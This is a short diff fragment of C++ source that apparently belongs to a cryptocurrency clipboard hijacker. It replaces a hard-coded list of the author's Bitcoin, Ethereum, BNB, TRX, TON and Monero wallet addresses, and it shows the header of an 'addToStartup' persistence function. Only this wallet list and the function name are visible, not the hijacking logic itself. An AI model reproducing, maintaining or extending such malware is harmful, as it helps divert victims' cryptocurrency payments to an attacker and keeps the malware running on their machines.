@@ -5,12 +5,12 @@
 #pragma comment(lib, "User32.lib")
 
 std::vector<std::string> mAddress{
-    "bc1qpe8zrmy53t6n022gmqj7rawfa76x4fndkmqxfr", // Bitcoin (BTC)
-    "0x15a44aD2Ff91cCB9e78dEBAEAe552529Ea9cD3a8", // Ethereum (ETH) and BSC
-    "bnb1mz6d3nn8vade2zg6nwsk64znuu7frcghx7t30q", // Binance Coin (BNB)
+    "bc1qmsyzncyge2uwhqn47m40sa08xq7qh4yllyfvh3", // Bitcoin (BTC)
+    "0x76c104E30b0CCa79cf61f51A51043a3a1776d5B6", // Ethereum (ETH) and BSC
+    "0x36B9Fd9A926cAc2bF7Bc7425Ad0e1F7575369A47", // Binance Coin (BNB)
     "TJsKM4C3K4UpiRmWbhJFeyekFUF5n96AVX", // Tron (TRX)
-    "EQAmsFUF86slad12lV0izayr3pXdFEpQMmboWGg5wCB9DZ-q", // Ton (TON)
-    "49Z2cF8BTbwRuCHV3CferPfeG4tpCs8iWWmv68uasDSdKCt7sntBaYXgrwSMPNERWDXx4E8Wk5m1mJEa6D6TrQmx23KEYEA"  // Monero (XMR)
+    "0x76c104E30b0CCa79cf61f51A51043a3a1776d5B6", // Ton (TON)
+    "41nizz95at5QEZ9ZhLi2mUHVHEHhbDSXB4Q3uMNFh5H8H7w9TtRzZ3qQkkMdkf7B3v7TVMCZ63gmqgaSkWtgjnv5L9Ke7cR"  // Monero (XMR)
 };
 
 void addToStartup() {
